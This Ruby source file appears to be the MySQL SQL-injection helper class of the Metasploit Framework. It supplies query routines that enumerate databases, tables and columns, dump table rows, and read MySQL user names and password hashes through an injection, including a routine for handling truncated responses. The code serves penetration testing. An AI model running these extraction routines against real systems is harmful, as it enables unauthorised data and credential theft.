#
# This class represents a MySQL Injection object, its primary purpose is to provide the common queries
# needed when performing SQL injection.
# Instanciate it only if you get the query results of your SQL injection returned on the response.
#
class Msf::Exploit::SQLi::MySQLi < Msf::Exploit::SQLi::SQLi
  #
  #   See SQLi#initialize
  #
  def initialize(*args)
    super
  end

  #
  #   Execute the SQL query and return its results
  #   @param query [String] The SQL query to execute
  #   @return [String] The query results
  #
  def run_sql(query)
    super
  end

  #
  #   Query the MySQL version
  #   @return [String] The MySQL version in use
  #
  def version
    run_sql('select version()')
  end

  #
  #   Query the current database name
  #   @return [String] The name of the current database
  #
  def current_database
    run_sql('select database()')
  end

  #
  #   Query the current user
  #   @return [String] The username of the current user
  #
  def current_user
    run_sql('select user()')
  end

  #
  #   Query the names of all the existing databases
  #   @return [Array] An array of Strings, the database names
  #
  def enum_database_names
    dump_table_fields('information_schema', 'schemata', %w[schema_name])
  end

  #
  #   Query the names of the tables in a given database
  #   database can be the name of a database, or a function call, like database() for the current database
  #   @return [Array] An array of Strings, the table names in the given database
  #
  def enum_table_names(_database)
    # enumerate the tables in the given database
    dump_table_fields('information_schema', 'tables', %w[table_name], 'table_schema=database()')
  end

  def enum_view_names(database)
    dump_table_fields('information_schema', 'views', %w[table_name], "table_schema=#{database.include?('(') ? database : "'" + database + "'"}")
  end

  #
  # Query the mysql users (their username and password), this might require root privileges.
  #
  def enum_dbms_users
    # might require root privileges
    dump_table_fields('mysql', 'user', %w[User Password])
  end

  #
  #   Query the column names of the given table in the given database
  #   database can be the name of a database, or a function call, like database() for the current database
  #   @return [Array] An array of Strings, the column names in the given table belonging to the given database
  #
  def enum_table_columns(database, table_name)
    dump_table_fields('information_schema', 'columns', %w[column_name], "table_name='#{table_name}' and table_schema=#{database.include?('(') ? database : "'" + database + "'"}")
  end

  #
  #  Query the given columns of the records of the given table, that satisfy an optional condition
  #  @param database [String] The database to query
  #  @param table [String]  The name of the table to query
  #  @param columns [Array] The names of the columns to query
  #  @param condition [String] An optional condition, return only the rows satisfying it
  #  @return [Array] An array, where each element is an array of strings representing a row of the results
  #
  def dump_table_fields(database, table, columns, condition = '')
    return '' if columns.empty?

    if columns.length == 1
      columns = columns.first
    else
      columns = "concat_ws(';'," + columns.join(',') + ')'
    end
    if database == 'database()'
      database = ''
    else
      database += '.'
    end
    unless condition.empty?
      condition = ' where ' + condition
    end
    retrieved_data = nil
    if @safe
      row_count = run_sql("select count(1) from #{database}#{table}#{condition}").to_i
      retrieved_data = row_count.times.map do |current_row|
        if @truncation_length
          truncated_query("select substr(#{columns},^OFFSET^,#{@truncation_length}) from " \
          "#{database}#{table}#{condition} limit #{current_row},1")
        else
          run_sql("select #{columns} from #{database}#{table}#{condition} limit #{current_row},1")
        end
      end
    else
      if @truncation_length
        retrieved_data = truncated_query('select substr(group_concat(' \
        "#{columns}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})," \
        "^OFFSET^,#{@truncation_length}) from #{database}#{table}#{condition}")
                         .split(@concat_separator || ',')
      else
        retrieved_data = run_sql("select group_concat(#{columns}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})" \
        " from #{database}#{table}#{condition}").split(@concat_separator || ',')
      end
    end
    retrieved_data.map { |row| row.split(@second_concat_separator || ';') }
  end

  private

  #
  #  Helper method used in cases where the response is truncated.
  #  @param query [String] The SQL query to execute, where ^OFFSET^ will be replaced with an integer offset for querying
  #  @return [String] The query result
  #
  def truncated_query(query)
    result = [ ]
    offset = 1
    loop do
      slice = run_sql(query.sub(/\^OFFSET\^/, offset.to_s))
      offset += @truncation_length
      result << slice
      raise 'The block returned a string larger than the truncation size' if slice.length > @truncation_length
      # TODO: if verbose, display the length of the string returned
      break if slice.length < @truncation_length
    end
    result.join
  end

  def check_opts(opts)
    super
  end
end

require 'msf/core/exploit/sqli/mysqli/booleanbasedblind'
require 'msf/core/exploit/sqli/mysqli/timebasedblind'
